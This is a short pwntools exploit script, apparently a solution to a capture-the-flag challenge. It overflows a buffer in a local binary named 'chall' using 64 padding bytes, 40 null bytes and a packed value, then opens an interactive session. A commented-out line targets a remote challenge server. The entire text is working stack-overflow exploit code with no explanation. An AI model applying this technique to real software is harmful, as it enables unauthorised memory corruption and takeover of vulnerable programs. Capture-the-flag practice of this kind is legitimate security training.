from pwn import *

#r = remote("34.50.87.57", 20002)
p = process("./chall")
elf = ELF("./chall")

padding = b"A" * 64
null = b'\x00' * 40
payload = padding + null
payload += p64(0xb)
p.sendline(payload)
p.interactive()

